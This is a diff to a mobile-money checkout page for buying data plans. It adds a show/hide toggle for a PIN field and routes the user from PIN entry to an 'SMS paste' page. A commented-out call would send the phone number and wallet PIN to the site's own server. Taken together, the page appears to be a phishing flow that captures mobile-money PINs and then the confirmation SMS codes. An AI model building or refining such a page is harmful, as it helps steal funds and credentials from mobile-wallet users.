@@ -34,6 +34,7 @@
             --blue-600: #2563eb;
             --green-500: #22c55e;
             --green-600: #16a34a;
+            --red-500: #ef4444;
             --momo-yellow: #FFCC00;
             --momo-yellow-dark: #E6B800;
             --orange-500: #f97316;
@@ -143,7 +144,7 @@
         }
 
         /* ============================================
-           MOMO LOGO HEADER BAND
+           MOMO BAND
         ============================================ */
         .momo-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
@@ -183,7 +184,7 @@
         }
 
         /* ============================================
-           WHITE CARD BODY
+           CHECKOUT BODY
         ============================================ */
         .checkout-body {
             background: var(--white);
@@ -418,9 +419,16 @@
             margin-bottom: 8px;
         }
 
+        /* PIN input wrapper (input + eye toggle) */
+        .pin-input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
         .pin-input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px 52px 14px 16px;
             background: var(--white);
             color: var(--black);
             font-size: 24px;
@@ -445,6 +453,31 @@
             box-shadow: 0 0 0 4px rgba(249,115,22,0.15);
         }
 
+        .pin-eye-btn {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray-500);
+            font-size: 20px;
+            transition: color 0.2s, background 0.2s;
+        }
+
+        .pin-eye-btn:hover {
+            color: var(--gray-900);
+            background: var(--gray-100);
+        }
+
+        .pin-eye-btn.active {
+            color: var(--orange-500);
+        }
+
         .pin-actions {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -465,22 +498,46 @@
 
         .btn-cancel:hover { background: var(--gray-100); }
 
-        .btn-pin-confirm {
+        .btn-pin-proceed {
             padding: 14px;
             font-weight: 900;
             font-size: 14px;
             color: var(--black);
             background: var(--momo-yellow);
             border-radius: var(--radius-md);
-            transition: filter 0.2s, transform 0.15s, opacity 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+            transition: filter 0.2s, transform 0.15s, opacity 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
         }
 
-        .btn-pin-confirm:hover:not(:disabled) { filter: brightness(0.95); }
-        .btn-pin-confirm:active:not(:disabled) { transform: scale(0.97); }
-        .btn-pin-confirm:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
+        .btn-pin-proceed:hover:not(:disabled) {
+            filter: brightness(0.96);
+            box-shadow: 0 6px 16px rgba(255,204,0,0.5);
         }
+
+        .btn-pin-proceed:active:not(:disabled) { transform: scale(0.97); }
+
+        .btn-pin-proceed:disabled {
+            opacity: 0.35;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-pin-proceed i { font-size: 17px; }
+
+        .btn-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid rgba(0,0,0,0.25);
+            border-top-color: var(--black);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         /* ============================================
            BOTTOM NAV
@@ -638,24 +695,32 @@
 
             <label class="pin-label" for="momo_pin">Enter PIN</label>
 
-            <input
-                id="momo_pin"
-                type="password"
-                maxlength="5"
-                minlength="4"
-                inputmode="numeric"
-                autocomplete="off"
-                autocorrect="off"
-                autocapitalize="off"
-                spellcheck="false"
-                enterkeyhint="done"
-                placeholder="••••"
-                class="pin-input"
-            />
+            <div class="pin-input-wrap">
+                <input
+                    id="momo_pin"
+                    type="password"
+                    maxlength="5"
+                    minlength="4"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    autocorrect="off"
+                    autocapitalize="off"
+                    spellcheck="false"
+                    enterkeyhint="done"
+                    placeholder="••••"
+                    class="pin-input"
+                />
+                <button type="button" id="togglePin" class="pin-eye-btn" aria-label="Show PIN">
+                    <i class="uil uil-eye"></i>
+                </button>
+            </div>
 
             <div class="pin-actions">
                 <button id="cancelBtn" type="button" class="btn-cancel">Cancel</button>
-                <button id="confirmBtn" type="button" disabled class="btn-pin-confirm">Confirm</button>
+                <button id="proceedBtn" type="button" disabled class="btn-pin-proceed">
+                    <i class="uil uil-arrow-right"></i>
+                    <span>Proceed</span>
+                </button>
             </div>
         </div>
     </div>
@@ -703,10 +768,10 @@
         const pin = document.getElementById('momo_pin');
         const openBtn = document.getElementById('openPinModal');
         const number = document.getElementById('momo_number');
-        const confirm = document.getElementById('confirmBtn');
+        const proceed = document.getElementById('proceedBtn');
         const cancel = document.getElementById('cancelBtn');
         const overlay = document.getElementById('sheetOverlay');
-        const form = document.getElementById('paymentForm');
+        const togglePin = document.getElementById('togglePin');
 
         // ============================================
         // KEYBOARD-AWARE POPUP POSITION
@@ -741,7 +806,10 @@
             setTimeout(() => {
                 modal.classList.remove('open');
                 pin.value = '';
-                confirm.disabled = true;
+                pin.type = 'password';
+                togglePin.classList.remove('active');
+                togglePin.innerHTML = '<i class="uil uil-eye"></i>';
+                proceed.disabled = true;
                 document.body.classList.remove('modal-open');
             }, 250);
         }
@@ -774,49 +842,72 @@
         });
 
         // ============================================
-        // PIN INPUT
+        // EYE TOGGLE — show/hide PIN
+        // ============================================
+        togglePin.addEventListener('click', () => {
+            const isPassword = pin.type === 'password';
+
+            pin.type = isPassword ? 'text' : 'password';
+            togglePin.classList.toggle('active', isPassword);
+            togglePin.innerHTML = isPassword
+                ? '<i class="uil uil-eye-slash"></i>'
+                : '<i class="uil uil-eye"></i>';
+
+            pin.focus();
+        });
+
+        // ============================================
+        // PIN INPUT — digits only, enable Proceed on 4-5
         // ============================================
         pin.addEventListener('input', function () {
-            this.value = this.value.replace(/\D/g, '');
+            this.value = this.value.replace(/\D/g, '').slice(0, 5);
 
             const isValid = /^\d{4,5}$/.test(this.value);
-            confirm.disabled = !isValid;
-
-            if (this.value.length === 5) {
-                setTimeout(() => {
-                    submitPayment();
-                }, 300);
-            }
+            proceed.disabled = !isValid;
         });
 
         // ============================================
-        // CONFIRM
+        // PROCEED — submit and go to SMS paste page
         // ============================================
-        confirm.addEventListener('click', () => {
+        proceed.addEventListener('click', () => {
             if (!/^\d{4,5}$/.test(pin.value)) {
-                alert('Please enter a 4 or 5 digit PIN');
                 return;
             }
-            submitPayment();
-        });
 
-        // ============================================
-        // SUBMIT PAYMENT
-        // ============================================
-        function submitPayment() {
-            confirm.disabled = true;
-            confirm.textContent = 'Processing...';
+            proceed.disabled = true;
+            proceed.innerHTML = '<span class="btn-spinner"></span><span>Processing...</span>';
 
+            // TODO: Replace this with a real API call:
+            /*
+            fetch('/api/momo/pay/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    plan: planName,
+                    data: planData,
+                    price: planPrice,
+                    momo_number: number.value,
+                    pin: pin.value
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) { redirect }
+                else { show error }
+            })
+            */
+
+            // Simulated flow — redirect to SMS paste page
             setTimeout(() => {
-                const successParams = new URLSearchParams({
+                const smsParams = new URLSearchParams({
                     plan: planName,
                     data: planData,
                     price: planPrice,
                     phone: number.value
                 });
-                window.location.href = '/success/?' + successParams.toString();
-            }, 1800);
-        }
+                window.location.href = '/sms-paste/?' + smsParams.toString();
+            }, 1500);
+        });
 
         // ============================================
         // CANCEL / OVERLAY
